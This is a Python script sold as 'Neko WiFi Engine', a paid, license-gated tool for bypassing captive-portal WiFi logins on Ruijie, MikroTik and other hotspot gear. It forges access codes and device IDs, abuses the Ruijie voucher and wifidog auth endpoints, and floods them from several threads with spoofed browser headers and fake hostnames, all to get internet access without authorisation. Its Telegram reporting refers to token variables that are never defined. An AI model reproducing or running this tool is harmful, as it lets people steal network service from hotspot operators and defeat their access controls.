#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import urllib3
import time
import threading
import os
import sys
import json
import string
import hashlib
import socket
import random
import logging
from datetime import datetime, date, timedelta
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# 1. CONFIGURATION
# ==========================================
# Google Sheets CSV Link (Updated)
SHEET_CSV_URL = "https://docs.google.com/spreadsheets/d/e/2PACX-1vS9j_VFK4Uj-Xgu_9sFxcs9hncC5egTA5424mfEHxGG83NL6rXYsOxMI7TqD-N_U2bXTwezqnxQWyLk/pub?output=csv"

# Local storage files
LOCAL_KEYS_FILE = os.path.expanduser("~/.ruijie_approved_keys.txt")
KEY_STORAGE_FILE = os.path.expanduser("~/.ruijie_device_key.txt")
LICENSE_INFO_FILE = os.path.expanduser("~/.ruijie_license_info.txt")

RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[95m", "\033[96m", "\033[97m", "\033[0m"
BOLD = "\033[1m"

stop_event = threading.Event()

# ==========================================
# 2. STABLE SYSTEM KEY (No changes)
# ==========================================

def get_stable_system_key():
    """Get stable system key that never changes"""
    
    if os.path.exists(KEY_STORAGE_FILE):
        try:
            with open(KEY_STORAGE_FILE, 'r') as f:
                saved_key = f.read().strip()
                if saved_key:
                    return saved_key
        except:
            pass
    
    try:
        import subprocess
        android_id = subprocess.check_output("settings get secure android_id", shell=True).decode().strip()
        if android_id and len(android_id) > 5:
            stable_key = hashlib.md5(f"STABLE_{android_id}".encode()).hexdigest()[:16]
        else:
            import uuid
            install_path = os.path.dirname(os.path.abspath(__file__))
            stable_key = hashlib.md5(f"{install_path}{uuid.getnode()}".encode()).hexdigest()[:16]
    except:
        import random as rand
        stable_key = ''.join(rand.choices(string.ascii_lowercase + string.digits, k=16))
    
    try:
        with open(KEY_STORAGE_FILE, 'w') as f:
            f.write(stable_key)
    except:
        pass
    
    return stable_key

def get_system_key():
    return get_stable_system_key()

# ==========================================
# 3. LICENSE INFO MANAGEMENT (Offline support)
# ==========================================

def save_license_info(expiry_date_str):
    """Save license info for offline use"""
    data = {
        "expiry": expiry_date_str,
        "saved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "valid": True
    }
    try:
        with open(LICENSE_INFO_FILE, 'w') as f:
            json.dump(data, f)
        return True
    except:
        return False

def load_license_info():
    """Load saved license info for offline use"""
    if os.path.exists(LICENSE_INFO_FILE):
        try:
            with open(LICENSE_INFO_FILE, 'r') as f:
                return json.load(f)
        except:
            pass
    return None

def is_license_valid_offline(expiry_date_str):
    """Check if license is still valid (offline)"""
    try:
        expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d").date()
        return date.today() <= expiry_date
    except:
        return False

def get_days_left_offline(expiry_date_str):
    """Get days left from saved expiry"""
    try:
        expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d").date()
        days_left = (expiry_date - date.today()).days
        return max(0, days_left)
    except:
        return 0

# ==========================================
# 4. AUTHORIZED KEYS FETCHER
# ==========================================

def fetch_authorized_keys_with_expiry():
    """Fetch authorized keys with expiry dates from Google Sheets"""
    keys_data = {}
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not line.startswith('keys') and not line.startswith('username'):
                    parts = line.split(',')
                    if len(parts) >= 1:
                        key = parts[0].strip().strip('"')
                        if key:
                            expiry = parts[2].strip().strip('"') if len(parts) > 2 else ""
                            msg = parts[3].strip().strip('"') if len(parts) > 3 else ""
                            keys_data[key] = {"expiry": expiry, "msg": msg}
            if keys_data:
                try:
                    with open(LOCAL_KEYS_FILE, 'w') as f:
                        for key, data in keys_data.items():
                            f.write(f"{key},{data['expiry']},{data['msg']}\n")
                except:
                    pass
            print(f"{GREEN}[✓] Loaded {len(keys_data)} keys from Google Sheets{RESET}")
            return keys_data
    except Exception as e:
        print(f"{YELLOW}[!] Google Sheets error: {e}{RESET}")
    
    # Try local cache
    try:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        parts = line.split(',')
                        if len(parts) >= 1:
                            key = parts[0]
                            expiry = parts[1] if len(parts) > 1 else ""
                            msg = parts[2] if len(parts) > 2 else ""
                            keys_data[key] = {"expiry": expiry, "msg": msg}
            print(f"{GREEN}[✓] Loaded {len(keys_data)} keys from local cache{RESET}")
            return keys_data
    except:
        pass
    
    return {}

def get_online_time():
    """Get current time from online API"""
    try:
        r = requests.get("http://worldtimeapi.org/api/timezone/Asia/Yangon", timeout=5)
        if r.status_code == 200:
            return datetime.fromisoformat(r.json()['datetime'].split('.')[0])
    except:
        pass
    return None

# ==========================================
# 5. AUTO KILL MONITOR
# ==========================================

def auto_kill_monitor(sys_key):
    """Monitor for key revocation or block"""
    while True:
        try:
            keys_data = fetch_authorized_keys_with_expiry()
            
            if sys_key in keys_data:
                expiry_str = keys_data[sys_key].get("expiry", "")
                msg = keys_data[sys_key].get("msg", "")
                
                # Check for BLOCK keyword
                if "BLOCK" in msg.upper():
                    print(f"\n{RED}[!!!] ACCESS REVOKED BY ADMIN{RESET}")
                    os._exit(0)
                
                # Check expiry
                if expiry_str and expiry_str != "UNLIMITED":
                    try:
                        expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d")
                        now = get_online_time() or datetime.now()
                        if now > expiry_date:
                            print(f"\n{RED}[!!!] SESSION EXPIRED: {expiry_str}{RESET}")
                            os._exit(0)
                    except:
                        pass
            else:
                # Key removed from server
                print(f"\n{RED}[!!!] KEY REMOVED FROM SERVER{RESET}")
                os._exit(0)
                
        except Exception as e:
            pass
        
        time.sleep(30)

# ==========================================
# 6. TELEGRAM NOTIFICATION
# ==========================================

def send_to_admin(key, status):
    """Send login notification to admin"""
    try:
        text = f"<b>🚀 Neko Engine {status}</b>\n\n👤 <b>Key:</b> <code>{key}</code>\n⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                     data={"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "HTML"}, timeout=5)
    except:
        pass

# ==========================================
# 7. HYBRID APPROVAL SYSTEM
# ==========================================

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_neko_banner():
    neko_art = f"""
{CYAN}        ╱|、
       (˚ˎ 。7  
        |、˜〵          
        じしˍ,)ノ {RESET}{GREEN}Neko WiFi Engine {RESET}{YELLOW}v10.0{RESET}
{CYAN}     「 internet bypass · stealth mode 」{RESET}
"""
    print(neko_art)

def check_approval():
    clear_screen()
    show_neko_banner()
    
    print(f"{MAGENTA}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    KEY APPROVAL SYSTEM (Hybrid)                         ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
    
    system_key = get_system_key()
    print(f"{WHITE}[*] System Key: {GREEN}{system_key}{RESET}")
    
    # First check saved license info (offline first)
    saved_license = load_license_info()
    if saved_license:
        expiry = saved_license.get('expiry')
        if expiry and is_license_valid_offline(expiry):
            days_left = get_days_left_offline(expiry)
            print(f"{GREEN}[✓] LICENSE ACTIVE (Offline Mode){RESET}")
            print(f"{GREEN}    Expires: {expiry} ({days_left} days left){RESET}")
            print(f"{GREEN}    Turbo Engine Unlocked{RESET}")
            time.sleep(1.5)
            
            # Ask user to continue
            print(f"\n{CYAN}[1] Start Engine{RESET}    {YELLOW}[2] Exit{RESET}")
            choice = input(f"{GREEN}> {RESET}")
            if choice == "1":
                send_to_admin(system_key, "STARTED (Offline Mode)")
                threading.Thread(target=auto_kill_monitor, args=(system_key,), daemon=True).start()
                return True
            else:
                sys.exit(0)
    
    # Try to get fresh data from Google Sheets
    print(f"{CYAN}[*] Checking online for license...{RESET}")
    authorized_keys_data = fetch_authorized_keys_with_expiry()
    
    if system_key in authorized_keys_data:
        data = authorized_keys_data[system_key]
        expiry_date_str = data.get("expiry", "")
        msg = data.get("msg", "")
        
        if expiry_date_str and expiry_date_str != "UNLIMITED":
            try:
                expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d").date()
                today = date.today()
                
                if today > expiry_date:
                    print(f"\n{RED}[✗] KEY EXPIRED!{RESET}")
                    print(f"{YELLOW}Expiry date: {expiry_date_str}{RESET}")
                    if os.path.exists(LICENSE_INFO_FILE):
                        os.remove(LICENSE_INFO_FILE)
                    return False
                else:
                    days_left = (expiry_date - today).days
                    print(f"\n{GREEN}[✓] KEY APPROVED ✓{RESET}")
                    print(f"{GREEN}    Expires: {expiry_date_str} ({days_left} days left){RESET}")
                    if msg:
                        print(f"{YELLOW}    Message: {msg}{RESET}")
                    print(f"{GREEN}    Turbo Engine Unlocked{RESET}")
                    save_license_info(expiry_date_str)
            except Exception as e:
                print(f"\n{YELLOW}[!] Date parsing error: {e}{RESET}")
                print(f"{GREEN}[✓] KEY APPROVED (No expiry check){RESET}")
                save_license_info("2099-12-31")
        else:
            print(f"\n{GREEN}[✓] KEY APPROVED (Lifetime){RESET}")
            if msg:
                print(f"{YELLOW}    Message: {msg}{RESET}")
            print(f"{GREEN}    Turbo Engine Unlocked{RESET}")
            save_license_info("2099-12-31")
        
        # Ask user to continue
        print(f"\n{CYAN}[1] Start Engine{RESET}    {YELLOW}[2] Exit{RESET}")
        choice = input(f"{GREEN}> {RESET}")
        if choice == "1":
            send_to_admin(system_key, "STARTED")
            threading.Thread(target=auto_kill_monitor, args=(system_key,), daemon=True).start()
            return True
        else:
            sys.exit(0)
    else:
        # Check if we have saved license (offline fallback)
        if saved_license:
            expiry = saved_license.get('expiry')
            if expiry and is_license_valid_offline(expiry):
                days_left = get_days_left_offline(expiry)
                print(f"\n{GREEN}[✓] USING SAVED LICENSE (Offline Mode){RESET}")
                print(f"{GREEN}    Expires: {expiry} ({days_left} days left){RESET}")
                print(f"{GREEN}    Turbo Engine Unlocked{RESET}")
                
                print(f"\n{CYAN}[1] Start Engine{RESET}    {YELLOW}[2] Exit{RESET}")
                choice = input(f"{GREEN}> {RESET}")
                if choice == "1":
                    send_to_admin(system_key, "STARTED (Offline Mode)")
                    threading.Thread(target=auto_kill_monitor, args=(system_key,), daemon=True).start()
                    return True
                else:
                    sys.exit(0)
        
        print(f"\n{RED}[✗] KEY NOT APPROVED{RESET}")
        print(f"{YELLOW}Add '{system_key}' to Column A in Google Sheets{RESET}")
        return False

# ==========================================
# 8. ENHANCED STEALTH LOGICS
# ==========================================

def get_natural_hostname():
    identities = ["iPhone-13-Pro", "Galaxy-S21-Ultra", "Redmi-Note-12", "Oppo-A57-WiFi", "Vivo-Y21-User", "Realme-C35-WLAN"]
    return random.choice(identities)

def get_stealth_headers(brand="GENERIC"):
    ua_list = [
        "Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
    ]
    random_id = ''.join(random.choices(string.digits, k=13))
    return {
        "User-Agent": random.choice(ua_list),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "X-Requested-With": "com.android.browser",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Sec-CH-UA-Mobile": "?1",
        "Sec-CH-UA-Platform": '"Android"',
        "X-Ruijie-Client-ID": random_id,
        "Connection": "keep-alive"
    }

def check_multi_dns(dns_list):
    latencies = []
    for ip in dns_list:
        try:
            start = time.perf_counter()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.8)
            sock.connect((ip, 53))
            latencies.append((time.perf_counter() - start) * 1000)
            sock.close()
        except:
            latencies.append(999)
    return min(latencies)

def get_network_intelligence():
    target_dns = ["8.8.8.8", "8.8.4.4", "1.1.1.1"]
    lat = check_multi_dns(target_dns)
    if lat < 70:
        return 0.4, 0.8, f"{GREEN}STABLE{RESET}", 4
    elif lat < 150:
        return 0.05, 0.15, f"{CYAN}JITTER{RESET}", 8
    else:
        return 0.005, 0.02, f"{RED}EMERGENCY{RESET}", 12

def identify_brand(url, text, headers=None):
    url = url.lower()
    text = text.lower()
    if headers is None: headers = {}
    headers = {k.lower(): v.lower() for k, v in headers.items()}
    ruijie_indicators = ["wifidog", "2060", "eportal", "ruijie", "reyee", "index_re.php"]
    if any(x in url for x in ruijie_indicators) or "ruijie" in headers.get('server', ''):
        return "RUIJIE"
    if "ruijie" in text or "reyee" in text or "auth/login" in url:
        return "RUIJIE"
    if any(x in url for x in ["/hotspot", "login?dst=", "error-login.html", "/guest/"]):
        return "MIKROTIK"
    if "mikrotik" in headers.get('server', '') or "powered by mikrotik" in text:
        return "MIKROTIK"
    if any(x in url for x in ["hw_login", "portal", "ar_login.html"]) or "huawei" in text:
        return "HUAWEI"
    if any(x in url for x in ["tplink", "omada", "uam/login"]) or "tp-link" in text:
        return "TP-LINK"
    if "meraki" in url or "cisco" in headers.get('server', '') or "n163" in url:
        return "CISCO"
    if "aruba" in url or "aruba_login" in text:
        return "ARUBA"
    return "GENERIC"

# ==========================================
# 9. CORE BYPASS ENGINE
# ==========================================

def ai_pulse_executor(auth_link, session, sid, brand):
    target_dns = ["8.8.8.8", "8.8.4.4", "1.1.1.1"]
    while not stop_event.is_set():
        try:
            p_min, p_max, mode, _ = get_network_intelligence()
            session.get(auth_link, timeout=4, verify=False, headers=get_stealth_headers(brand))
            current_lat = check_multi_dns(target_dns)
            print(f"{BLUE}[PRO-TUNER]{RESET} {brand} | {mode} | Ping: {current_lat:.1f}ms   ", end="\r")
            time.sleep(random.uniform(p_min, p_max))
        except Exception as e:
            print(f"{RED}[!] Connection Lost. Retrying...{RESET}      ", end="\r")
            time.sleep(1)
            continue

def start_bypass():
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    print(f"\n{CYAN}[*] Initializing Neko Stealth Engine...{RESET}")
    
    while True:
        try:
            if requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=2).status_code == 204:
                print(f"{GREEN}[✔] ONLINE! HOLDING SESSION...{RESET}             ", end="\r")
                time.sleep(10)
                continue

            r1 = session.get("http://1.1.1.1", allow_redirects=True, timeout=5, headers=get_stealth_headers())
            portal_url = r1.url
            parsed = urlparse(portal_url)
            params = parse_qs(parsed.query)

            session.headers.update(get_stealth_headers())
            session.headers.update({
                'Origin': f"{parsed.scheme}://{parsed.netloc}",
                'Referer': f"{parsed.scheme}://{parsed.netloc}/"
            })

            r2 = session.get(portal_url, verify=False, timeout=5)
            brand = identify_brand(portal_url, r2.text, r2.headers)

            sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', portal_url + r2.text)
            if not sid_match:
                path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r2.text)
                if path_match:
                    next_url = urljoin(portal_url, path_match.group(1))
                    r2 = session.get(next_url, verify=False, timeout=5)
                    sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r2.url + r2.text)
                    brand = identify_brand(r2.url, r2.text, r2.headers)

            sid = sid_match.group(1) if sid_match else None

            if sid:
                fake_device_id = hashlib.md5(sid.encode()).hexdigest()[:12]
                threads = 4 if brand == "RUIJIE" else 5
                print(f"\n{GREEN}[⚡] SID: {sid[:10]} | BRAND: {brand}{RESET}")
                char_pool = string.ascii_letters + string.digits
                current_code = ''.join(random.choice(char_pool) for _ in range(6))
                print(f"{CYAN}[*] AccessCode: {YELLOW}{current_code}{RESET}")

                gw_ip = params.get('gw_address', [parsed.netloc.split(':')[0]])[0]
                original_port = parsed.port if parsed.port else (443 if parsed.scheme == 'https' else 80)

                if brand == "RUIJIE":
                    gw_port = params.get('gw_port', ['2060'])[0]
                    auth_link = f"http://{gw_ip}:{gw_port}/wifidog/auth?token={sid}&phonenumber={current_code}"
                    try:
                        session.post(
                            f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/",
                            json={
                                'accessCode': current_code,
                                'sessionId': sid,
                                'apiVersion': 1,
                                'clientIp': params.get('ip', [''])[0],
                                'nasIp': params.get('nasip', [''])[0],
                                'deviceId': fake_device_id
                            },
                            timeout=15
                        )
                    except:
                        pass
                elif brand == "MIKROTIK":
                    auth_link = f"{parsed.scheme}://{gw_ip}/login?dst=http://1.1.1.1&username={sid}"
                else:
                    auth_link = f"{parsed.scheme}://{gw_ip}:{original_port}/auth?token={sid}"

                stop_event.clear()
                for _ in range(threads):
                    threading.Thread(target=ai_pulse_executor, args=(auth_link, session, sid, brand), daemon=True).start()
                time.sleep(8)
        except Exception as e:
            time.sleep(2)
            continue

# ==========================================
# 10. ENTRY POINT
# ==========================================

if __name__ == "__main__":
    # Command line arguments for key management
    if len(sys.argv) > 1 and sys.argv[1] == "--key":
        print(f"\n{GREEN}Your System Key: {get_system_key()}{RESET}")
        print(f"{YELLOW}Add this key to Column A in Google Sheets (Column C = expiry, Column D = message){RESET}")
        print(f"{CYAN}[!] This key is stable and will not change{RESET}")
        sys.exit(0)
    
    if len(sys.argv) > 1 and sys.argv[1] == "--reset-key":
        if os.path.exists(KEY_STORAGE_FILE):
            os.remove(KEY_STORAGE_FILE)
            print(f"{GREEN}[✓] Key storage cleared! Run again to generate new key.{RESET}")
        else:
            print(f"{YELLOW}[!] No key storage found{RESET}")
        sys.exit(0)
    
    if len(sys.argv) > 1 and sys.argv[1] == "--reset-cache":
        if os.path.exists(LOCAL_KEYS_FILE):
            os.remove(LOCAL_KEYS_FILE)
            print(f"{GREEN}[✓] Cache cleared!{RESET}")
        else:
            print(f"{YELLOW}[!] No cache found{RESET}")
        sys.exit(0)
    
    if len(sys.argv) > 1 and sys.argv[1] == "--reset-license":
        if os.path.exists(LICENSE_INFO_FILE):
            os.remove(LICENSE_INFO_FILE)
            print(f"{GREEN}[✓] License info cleared!{RESET}")
        else:
            print(f"{YELLOW}[!] No license info found{RESET}")
        sys.exit(0)
    
    if check_approval():
        try:
            start_bypass()
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n{RED}[!] Engine Stopped.{RESET}")
            sys.exit(0)
    else:
        sys.exit(1)